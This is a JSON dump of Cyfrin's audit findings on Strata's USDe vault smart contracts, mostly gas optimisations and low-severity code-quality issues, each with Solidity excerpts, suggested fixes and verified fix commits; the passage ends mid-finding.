{
  "category": "Derivatives",
  "total_findings": 721,
  "fetched_at": "2026-01-29T13:30:50Z",
  "findings": [
    {
      "id": "57052",
      "title": "Unnecessarily complex iteration logic in `MetaVault::redeemMetaVaults` can be simplified",
      "impact": "GAS",
      "content": "**Description:** `MetaVault::redeemMetaVaults` is currently implemented as a while loop, indexing the first array element and calling `MetaVault::removeVaultAndRedeemInner` which implements a \"replace-and-pop\" solution for removing elements from the `assetsArr` array:\n\n```solidity\n    function removeVaultAndRedeemInner (address vaultAddress) internal {\n        // Redeem\n        uint balance = IERC20(vaultAddress).balanceOf(address(this));\n        if (balance > 0) {\n            IERC4626(vaultAddress).redeem(balance, address(this), address(this));\n        }\n\n        // Clean\n        TAsset memory emptyAsset;\n        assetsMap[vaultAddress] = emptyAsset;\n        uint length = assetsArr.length;\n        for (uint i = 0; i < length; i++) {\n            if (assetsArr[i].asset == vaultAddress) {\n@>              assetsArr[i] = assetsArr[length - 1];\n@>              assetsArr.pop();\n                break;\n            }\n        }\n    }\n\n    function redeemMetaVaults () internal {\n        while (assetsArr.length > 0) {\n@>          removeVaultAndRedeemInner(assetsArr[0].asset);\n        }\n    }\n```\n\nWhile this logic is still required for use in `MetaVault::removeVault`, where the contract admin can manually remove a single underlying vault, it would be preferable to avoid re-using this functionality for `MetaVault::redeemMetaVaults`. Instead, starting at the final element and walking backwards would preserve the ordering of the array and avoid unnecessary storage writes.\n\n**Strata:** Fixed in commit [fbb6818](https://github.com/Strata-Money/contracts/commit/fbb6818f5c1f621a25c58a40f1673609ad9611fb) and [98bd92d](https://github.com/Strata-Money/contracts/commit/98bd92d0aed75161332227239859c34161df1bcc).\n\n**Cyfrin:** Verified. The logic has been simplified by iterating over the asset addresses, deleting the individual mapping entries, and finally deleting the array.",
      "summary": "",
      "quality_score": 3.666666666666667,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57051",
      "title": "Remove unused return value from `pUSDeVault::stakeUSDe` and explicitly revert if `USDeAssets == 0`",
      "impact": "GAS",
      "content": "**Description:** Remove unused return value from `pUSDeVault::stakeUSDe` and explicitly revert if `USDeAssets == 0`.\n\n**Strata:** Fixed in commit [513d589](https://github.com/Strata-Money/contracts/commit/513d5890771d9bbe520740ef8f26a24931bf5590).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 4,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57050",
      "title": "Superfluous vault support validation can be removed from `pUSDeDepositor::deposit`",
      "impact": "GAS",
      "content": "**Description:** If the caller to `pUSDeDepositor::deposit` attempts to deposit a vault token that is not `USDe` or one of those preconfigured with an auto swap path, it will first query `MetaVault::isAssetSupported`:\n\n```solidity\n    function deposit(IERC20 asset, uint256 amount, address receiver) external returns (uint256) {\n        address user = _msgSender();\n        ...\n        IMetaVault vault = IMetaVault(address(pUSDe));\n@>      if (vault.isAssetSupported(address(asset))) {\n            SafeERC20.safeTransferFrom(asset, user, address(this), amount);\n            asset.approve(address(vault), amount);\n            return vault.deposit(address(asset), amount, receiver);\n        }\n@>      revert InvalidAsset(address(asset));\n    }\n```\n\nIf the specified vault token fails all validation then it falls through to the `InvalidAsset` custom error; however, this is not strictly necessary as `MetaVault::deposit` already performs the same validation within `MetaVault::requireSupportedVault`:\n\n```solidity\n    function deposit(address token, uint256 tokenAssets, address receiver) public virtual returns (uint256) {\n        if (token == asset()) {\n            return deposit(tokenAssets, receiver);\n        }\n@>      requireSupportedVault(token);\n        ...\n    }\n\n    function requireSupportedVault(address token) internal view {\n        address vaultAddress = assetsMap[token].asset;\n        if (vaultAddress == address(0)) {\n@>          revert UnsupportedAsset(token);\n        }\n    }\n```\n\n**Recommended Mitigation:** If it is not intentionally desired to fail early, consider removing the superfluous validation to save gas in the happy path case:\n\n```diff\nfunction deposit(IERC20 asset, uint256 amount, address receiver) external returns (uint256) {\n        address user = _msgSender();\n        ...\n        IMetaVault vault = IMetaVault(address(pUSDe));\n--      if (vault.isAssetSupported(address(asset))) {\n            SafeERC20.safeTransferFrom(asset, user, address(this), amount);\n            asset.approve(address(vault), amount);\n            return vault.deposit(address(asset), amount, receiver);\n--      }\n--      revert InvalidAsset(address(asset));\n    }\n```\n\n**Strata:** Fixed in commit [7f0c5dc](https://github.com/Strata-Money/contracts/commit/7f0c5dc54d1230589e2d9403b69effd64fb35227).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57049",
      "title": "`PreDepositVault` checks should fail early",
      "impact": "GAS",
      "content": "**Description:** `PreDepositVault` implements after deposit/withdrawal checks to enforce several invariants; however, it is only necessary to check the minimum shares violation after execution of the calling functions. To consume less gas, it is better to split these checks into separate before/after functions and revert early if either deposits or withdrawals are disabled.\n\n```solidity\nfunction onAfterDepositChecks () internal view {\n    if (!depositsEnabled) {\n        revert DepositsDisabled();\n    }\n}\nfunction onAfterWithdrawalChecks () internal view {\n    if (!withdrawalsEnabled) {\n        revert WithdrawalsDisabled();\n    }\n    if (totalSupply() < MIN_SHARES) {\n        revert MinSharesViolation();\n    }\n}\n```\n\n**Strata:** Acknowledged, as the pause state is considered an edge case, so in normal use users would instead benefit from a single method call for all the required checks.\n\n**Cyfrin:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57048",
      "title": "Inline small internal functions only used once",
      "impact": "GAS",
      "content": "**Description:** It is more gas efficient to inline small internal functions only used once.\n\nFor example `pUSDeDepositor::getPhase` is only called by `deposit_sUSDe`. Changing `deposit_sUSDe` to cache `pUSDe` then use the cached copy in the call to `PreDepositPhaser::currentPhase` saves 1 storage read in addition to saving the function call overhead.\n\n**Strata:** Fixed in commit [9398379](https://github.com/Strata-Money/contracts/commit/93983791adbd45a555d947a12a5a6fd9bbfe7330).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57047",
      "title": "Use named returns where this can eliminate in-function variable declaration",
      "impact": "GAS",
      "content": "**Description:** Use named returns where this can eliminate in-function variable declaration:\n\n* `yUSDeVault` : functions `totalAccruedUSDe`, `_convertAssetsToUSDe`, `previewDeposit`, `previewMint`\n* `pUSDeVault` : function `previewYield`\n* `MetaVault` : functions `deposit`, `mint`, `withdraw`, `redeem`\n\n**Strata:** Fixed in commits [3241635](https://github.com/Strata-Money/contracts/commit/32416357ac166b072e4339471107e40950952a08) and [c68a705](https://github.com/Strata-Money/contracts/commit/c68a7053097a1909c13c98b6a5678a102f3f5007).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57046",
      "title": "Using `calldata` is more efficient to `memory` for read-only external function inputs",
      "impact": "GAS",
      "content": "**Description:** Using `calldata` is more efficient to `memory` for read-only external function inputs:\n\n`PreDepositVault`:\n```solidity\n35:        , string memory name\n36:        , string memory symbol\n```\n\n**Strata Money:**\n\"initialize\" (__init_Vault) is now internal, so the calldata can't be used with the parameters.\n\n**Cyfrin:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57045",
      "title": "Cache identical storage reads",
      "impact": "GAS",
      "content": "**Description:** As reading from storage is expensive, it is more gas-efficient to cache values and read them from the cache if the storage has not changed. Cache identical storage reads:\n\n`PreDepositPhaser.sol`:\n```solidity\n// use PreDepositPhase.YieldPhase instead\n19:        emit PhaseStarted(currentPhase);\n```\n\n`pUSDeDepositor.sol`:\n```solidity\n// cache sUSDe and pUSDe to save 3 storage reads\n// also change `deposit` to cache `sUSDe` and pass it as input to `deposit_sUSDe` saves 1 more storage read\n96:            SafeERC20.safeTransferFrom(sUSDe, from, address(this), amount);\n98:        sUSDe.approve(address(pUSDe), amount);\n99:        return IMetaVault(address(pUSDe)).deposit(address(sUSDe), amount, receiver);\n\n// cache USDe and pUSDe to save 2 storage reads\n// also change `deposit` to cache `USDe` and pass it as input to `deposit_USDe` saves 1 more storage read\n107:            SafeERC20.safeTransferFrom(USDe, from, address(this), amount);\n110:        USDe.approve(address(pUSDe), amount);\n111:        return pUSDe.deposit(amount, receiver);\n\n// cache USDe to save 2 storage reads\n// also change `deposit` to cache `USDe` and `autoSwaps[address(asset)]` then pass them as inputs to `deposit_viaSwap` saves 2 more storage reads\n127:        uint256 USDeBalance = USDe.balanceOf(address(this));\n130:            tokenOut: address(USDe),\n140:        uint256 amountOut = USDe.balanceOf(address(this)) - USDeBalance;\n```\n\n`yUSDeDepositor.sol`:\n```solidity\n// cache pUSDe and yUSDe to save 2 storage reads\n56:            SafeERC20.safeTransferFrom(pUSDe, from, address(this), amount);\n58:        pUSDe.approve(address(yUSDe), amount);\n59:        return yUSDe.deposit(amount, receiver);\n```\n\n`MetaVault.sol`:\n```solidity\n// cache assetsArr.length\n241:        for (uint i = 0; i < assetsArr.length; i++) {\n```\n\n**Strata:** Fixed in commit [9a19939](https://github.com/Strata-Money/contracts/commit/9a1993975912fbcbaf684811b25de229947671c9).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57044",
      "title": "Inconsistency in `currentPhase` between `pUSDeVault` and `yUSDeVault`",
      "impact": "LOW",
      "content": "**Description:** Both `pUSDeVault` and `yUSDeVault` inherit the `PreDepositVault` which in turn inherits the `PreDepositPhaser`; however, there is an inconsistency between the state of `pUSDe::currentPhase`, which is updated when the phase changes, and `yUSDe::currentPhase`, which is never updated and is thus always the default `PointsPhase` variant. This is assumedly not an issue given that this state is never needed for the yUSDe vault, though a view function is exposed by virtue of the state variable being public which could cause confusion.\n\n**Recommended Mitigation:** The simplest solution would be modifying this state to be internal by default and only expose the corresponding view function within `pUSDeVault`.\n\n**Strata:** Fixed in commit [aac3b61](https://github.com/Strata-Money/contracts/commit/aac3b617084fb5a06b29728a9f52e5884b062b6a).\n\n**Cyfrin:** Verified. The `yUSDeVault` now returns the `pUSDeVault` phase state.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57043",
      "title": "`PreDepositVault::initialize` should not be exposed as public",
      "impact": "LOW",
      "content": "**Description:** `PreDepositVault::initialize` is currently exposed as public. Based on the `pUSDeVault` and `yUSDeVault` implementations that invoke this super function, it is not intended. While this does not appear to be exploitable or cause any issues that prevent initialization, it would be better to mark this base implementation as internal and use the `onlyInitializing` modifier instead.\n\n```diff\n    function initialize(\n        address owner_\n        , string memory name\n        , string memory symbol\n        , IERC20 USDe_\n        , IERC4626 sUSDe_\n        , IERC20 stakedAsset\n--  ) public virtual initializer {\n++  ) internal virtual onlyInitializing {\n        __ERC20_init(name, symbol);\n        __ERC4626_init(stakedAsset);\n        __Ownable_init(owner_);\n\n        USDe = USDe_;\n        sUSDe = sUSDe_;\n    }\n```\n\n**Strata:** Fixed in commits [6ac05c2](https://github.com/Strata-Money/contracts/commit/6ac05c232a47de6e9935fd6e20af1f0c4540c457) and [def7d36](https://github.com/Strata-Money/contracts/commit/def7d360225f49662c73bf968d63d935c82d9d0e).\n\n**Cyfrin:** Verified. `PreDepositVault::initialize` is now marked as internal and uses the `onlyInitializing` modifier.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57042",
      "title": "Missing zero deposit amount validation",
      "impact": "LOW",
      "content": "**Description:** Unlike `pUSDeDepositor::deposit_USDe`, `pUSDeDepositor::deposit_sUSDe` does not enforce that the deposited amount is non zero:\n\n```solidity\nrequire(amount > 0, \"Deposit is zero\");\n```\n\nA similar case is present when comparing `yUSDeDepositor::deposit_pUSDeDepositor` and `yUSDeDepositor::deposit_pUSDe`.\n\n**Strata:** Fixed in commit [1378b6a](https://github.com/Strata-Money/contracts/commit/1378b6af08e60aaa768693a9332e98dbb4f01776).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57041",
      "title": "Use unchained initializers instead",
      "impact": "LOW",
      "content": "**Description:** The direct use of initializer functions rather than their unchained equivalents should be avoided to prevent [potential duplicate initialization](https://docs.openzeppelin.com/contracts/5.x/upgradeable#multiple-inheritance).\n\n**Strate:**\nFixed in commit [def7d36](https://github.com/Strata-Money/contracts/commit/def7d360225f49662c73bf968d63d935c82d9d0e).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57040",
      "title": "Prefix internal and private function names with `_` character",
      "impact": "LOW",
      "content": "**Description:** It is considered good practice in Solidity to prefix internal and private function names with `_` character. This is done sometimes but not other times; ideally apply this consistently:\n```solidity\npredeposit/PreDepositPhaser.sol\n15:    function setYieldPhaseInner () internal {\n\npredeposit/yUSDeDepositor.sol\n54:    function deposit_pUSDe (address from, uint256 amount, address receiver) internal returns (uint256) {\n62:    function deposit_pUSDeDepositor (address from, IERC20 asset, uint256 amount, address receiver) internal returns (uint256) {\n\npredeposit/PreDepositVault.sol\n59:    function onAfterDepositChecks () internal view {\n64:    function onAfterWithdrawalChecks () internal view {\n\npredeposit/pUSDeVault.sol\n93:    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {\n115:    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {\n177:    function stakeUSDe(uint256 USDeAssets) internal returns (uint256) {\n\npredeposit/yUSDeVault.sol\n43:    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {\n79:    function _deposit(address caller, address receiver, uint256 pUSDeAssets, uint256 shares) internal override {\n86:    function _withdraw(address caller, address receiver, address owner, uint256 pUSDeAssets, uint256 shares) internal override {\n101:    function _valueMulDiv(uint256 value, uint256 mulValue, uint256 divValue, Math.Rounding rounding) internal view virtual returns (uint256) {\n\npredeposit/MetaVault.sol\n84:    function _deposit(address token, address caller, address receiver, uint256 baseAssets, uint256 tokenAssets, uint256 shares) internal virtual {\n160:    ) internal virtual {\n175:    function requireSupportedVault(address token) internal view {\n191:    function addVaultInner (address vaultAddress) internal {\n209:    function removeVaultAndRedeemInner (address vaultAddress) internal {\n231:    function redeemMetaVaults () internal {\n240:    function redeemRequiredBaseAssets (uint baseTokens) internal {\n\npredeposit/pUSDeDepositor.sol\n92:    function deposit_sUSDe (address from, uint256 amount, address receiver) internal returns (uint256) {\n102:    function deposit_USDe (address from, uint256 amount, address receiver) internal returns (uint256) {\n114:    function deposit_viaSwap (address from, IERC20 token, uint256 amount, address receiver) internal returns (uint256) {\n146:    function getPhase () internal view returns (PreDepositPhase phase) {\n\ntest/ethena/StakedUSDe.sol\n190:  function _checkMinShares() internal view {\n203:    internal\n225:    internal\n239:  function _updateVestingAmount(uint256 newVestingAmount) internal {\n251:  function _beforeTokenTransfer(address from, address to, uint256) internal virtual {\n\ntest/ethena/SingleAdminAccessControl.sol\n72:  function _grantRole(bytes32 role, address account) internal override returns (bool) {\n```\n\n**Strata:** Fixed in commit [b154fec](https://github.com/Strata-Money/contracts/commit/b154fec8957a81b3c0cf6e204e894d60bb0d852b).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57039",
      "title": "Use explicit sizes instead of `uint`",
      "impact": "LOW",
      "content": "**Description:** While `uint` defaults to `uint256`, it is considered good practice to use the explicit types including the size and to avoid using `uint`:\n```solidity\npredeposit/yUSDeDepositor.sol\n65:        uint beforeAmount = asset.balanceOf(address(this));\n73:        uint pUSDeShares = pUSDeDepositor.deposit(asset, amount, address(this));\n\npredeposit/MetaVault.sol\n53:        uint baseAssets = IERC4626(token).previewRedeem(tokenAssets);\n54:        uint shares = previewDeposit(baseAssets);\n70:        uint baseAssets = previewMint(shares);\n71:        uint tokenAssets = IERC4626(token).previewWithdraw(baseAssets);\n211:        uint balance = IERC20(vaultAddress).balanceOf(address(this));\n219:        uint length = assetsArr.length;\n220:        for (uint i = 0; i < length; i++) {\n240:    function redeemRequiredBaseAssets (uint baseTokens) internal {\n241:        for (uint i = 0; i < assetsArr.length; i++) {\n243:            uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));\n\npredeposit/pUSDeVault.sol\n62:            uint total_sUSDe = sUSDe.balanceOf(address(this));\n63:            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);\n65:            uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);\n67:            uint y_pUSDeShares = balanceOf(caller);\n68:            uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);\n121:            uint sUSDeAssets = sUSDe.previewWithdraw(assets);\n138:        uint USDeBalance = USDe.balanceOf(address(this));\n171:        uint USDeBalance = USDe.balanceOf(address(this));\n\npredeposit/yUSDeVault.sol\n38:        uint pUSDeAssets = super.totalAssets();\n39:        uint USDeAssets = _convertAssetsToUSDe(pUSDeAssets, true);\n43:    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {\n44:        uint sUSDeAssets = pUSDeVault.previewRedeem(withYield ? address(this) : address(0), pUSDeAssets);\n45:        uint USDeAssets = sUSDe.previewRedeem(sUSDeAssets);\n59:        uint underlyingUSDe = _convertAssetsToUSDe(pUSDeAssets, false);\n60:        uint yUSDeShares = _valueMulDiv(underlyingUSDe, totalAssets(), totalAccruedUSDe(), Math.Rounding.Floor);\n74:        uint underlyingUSDe = _valueMulDiv(yUSDeShares, totalAccruedUSDe(), totalAssets(), Math.Rounding.Ceil);\n75:        uint pUSDeAssets = pUSDeVault.previewDeposit(underlyingUSDe);\n\n```\n\n**Strata:** Fixed in commit [61f5910](https://github.com/Strata-Money/contracts/commit/61f591088754e2666355307cf1e11e6440af8572).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57038",
      "title": "Don't initialize to default values",
      "impact": "LOW",
      "content": "**Description:** Don't initialize to default values as Solidity already does this:\n```solidity\npredeposit/MetaVault.sol\n220:        for (uint i = 0; i < length; i++) {\n241:        for (uint i = 0; i < assetsArr.length; i++) {\n```\n\n**Strata:** Fixed in commit [07b471f](https://github.com/Strata-Money/contracts/commit/07b471f8292d62098ee4ffd97e62d6f0854d96ce).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57037",
      "title": "Disable initializers on upgradeable contracts",
      "impact": "LOW",
      "content": "**Description:** Disable initializers on upgradeable contracts:\n* `yUSDeVault`\n* `yUSDeDepositor`\n* `pUSDeVault`\n* `pUSDeDepositor`\n\n```diff\n+    /// @custom:oz-upgrades-unsafe-allow constructor\n+    constructor() {\n+       _disableInitializers();\n+    }\n```\n\n**Strata:** Fixed in commit [49060b2](https://github.com/Strata-Money/contracts/commit/49060b25230389feff54597a025a7aa129ceb9f3).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57036",
      "title": "Use named mappings to explicitly denote the purpose of keys and values",
      "impact": "LOW",
      "content": "**Description:** Use named mappings to explicitly denote the purpose of keys and values:\n```solidity\npredeposit/MetaVault.sol\n23:    // Track the assets in the mapping for easier access\n24:    mapping(address => TAsset) public assetsMap;\n\npredeposit/pUSDeDepositor.sol\n35:    mapping (address => TAutoSwap) autoSwaps;\n\ntest/MockStakedUSDe.sol\n20:  mapping(address => UserCooldown) public cooldowns;\n```\n\n**Strata:** Fixed in commit [ab231d9](https://github.com/Strata-Money/contracts/commit/ab231d99e4ba6c7c82c4928515775a39dc008808).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57035",
      "title": "`yUSDeVault` edge cases should be explicitly handled to prevent view functions from reverting",
      "impact": "LOW",
      "content": "**Description:** Per the ERC-4626 specification, the preview functions \"MUST NOT revert due to vault specific user/global limits. MAY revert due to other conditions that would also cause mint/deposit/redeem/withdraw to revert\".\n\n```solidity\n    function totalAccruedUSDe() public view returns (uint256) {\n@>      uint pUSDeAssets = super.totalAssets();  // @audit - should return early if pUSDeAssets is zero to avoid reverting in the call below\n\n@>      uint USDeAssets = _convertAssetsToUSDe(pUSDeAssets, true);\n        return USDeAssets;\n    }\n\n    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {\n@>      uint sUSDeAssets = pUSDeVault.previewRedeem(withYield ? address(this) : address(0), pUSDeAssets); // @audit - this can revert if passing yUSDe as the caller when it has no pUSDe balance\n        uint USDeAssets = sUSDe.previewRedeem(sUSDeAssets);\n        return USDeAssets;\n    }\n\n    function previewDeposit(uint256 pUSDeAssets) public view override returns (uint256) {\n        uint underlyingUSDe = _convertAssetsToUSDe(pUSDeAssets, false);\n\n@>      uint yUSDeShares = _valueMulDiv(underlyingUSDe, totalAssets(), totalAccruedUSDe(), Math.Rounding.Floor); // @audit - should explicitly handle the case where totalAccruedUSDe() returns zero rather than relying on _valueMulDiv() behaviour\n        return yUSDeShares;\n    }\n\n    function previewMint(uint256 yUSDeShares) public view override returns (uint256) {\n@>      uint underlyingUSDe = _valueMulDiv(yUSDeShares, totalAccruedUSDe(), totalAssets(), Math.Rounding.Ceil); // @audit - should explicitly handle the case where totalAccruedUSDe() and/or totalAssets() returns zero rather than relying on _valueMulDiv() behaviour\n        uint pUSDeAssets = pUSDeVault.previewDeposit(underlyingUSDe);\n        return pUSDeAssets;\n    }\n\n    function _valueMulDiv(uint256 value, uint256 mulValue, uint256 divValue, Math.Rounding rounding) internal view virtual returns (uint256) {\n        return value.mulDiv(mulValue + 1, divValue + 1, rounding);\n    }\n```\n\nAs noted using `// @audit` tags in the code snippets above, `yUSDeVault::previewMint` and `yUSDeVault::previewDeposit` can revert for multiple reasons, including:\n* when the pUSDe balance of the yUSDe vault is zero.\n* when `pUSDeVault::previewRedeem` reverts due to division by zero in `pUSDeVault::previewYield`, invoked from `_convertAssetsToUSDe()` within `totalAccruedUSDe()`.\n\n```solidity\n     function previewYield(address caller, uint256 shares) public view virtual returns (uint256) {\n        if (PreDepositPhase.YieldPhase == currentPhase && caller == address(yUSDe)) {\n\n            uint total_sUSDe = sUSDe.balanceOf(address(this));\n            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);\n\n            uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);\n\n@>          uint y_pUSDeShares = balanceOf(caller); // @audit - should return early if this is zero to avoid reverting below\n@>          uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);\n\n            return caller_yield_USDe;\n        }\n        return 0;\n    }\n\n    function previewRedeem(address caller, uint256 shares) public view virtual returns (uint256) {\n        return previewRedeem(shares) + previewYield(caller, shares);\n    }\n```\n\nWhile a subset of these reverts could be considered \"due to other conditions that would also cause deposit to revert\", such as due to overflow, it would be better to explicitly handle these other edge cases. Additionally, even when called in isolation `yUSDeVault::totalAccruedUSDe` will revert if the pUSDe balance of the yUSDeVault is zero. Instead, this should simply return zero.\n\n**Strata:** Fixed in commit [0f366e1](https://github.com/Strata-Money/contracts/commit/0f366e192941c875b651ee4db89b9fd3242a5ac0).\n\n**Cyfrin:** Verified. The zero assets/shares edge cases are now explicitly handled in `yUSDeVault::_convertAssetsToUSDe` and pUSDeVault::previewYield`, including when the `yUSDe` state is not initialized as so will be equal to the zero address.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57034",
      "title": "Inability to remove and redeem from vaults with withdrawal issues could result in a bank-run",
      "impact": "LOW",
      "content": "**Description:** When deposits are made to the `pUSDeVault`, `depositedBase` is incremented based on the previewed quote amount of USDe underlying the external ERC-4626 vaults; however, these instantaneous preview quotes are not necessarily accurate when compared to the maximum amount that is actually withdrawable. For example, `MetaVault::deposit` implements calculation of the base USDe assets as:\n\n```solidity\nuint baseAssets = IERC4626(token).previewRedeem(tokenAssets);\n```\n\nBut if the vault has overridden the max withdraw/redeem functions with custom logic that apply some limits then this previewed value could be larger than the actual maximum withdrawable USDe amount. This is possible because the ERC-4626 specification states that preview functions must not account for withdrawal/redemption limits like those returned from maxWithdraw/maxRedeem and should always act as though the redemption would be accepted.\n\nTherefore, given that there is not actually a withdrawal that is executed during the deposit, the `depositedBase` state is incremented assuming the underlying USDe if fully redeemable, but it is not until removing and redeeming the vault that a revert could arise if the 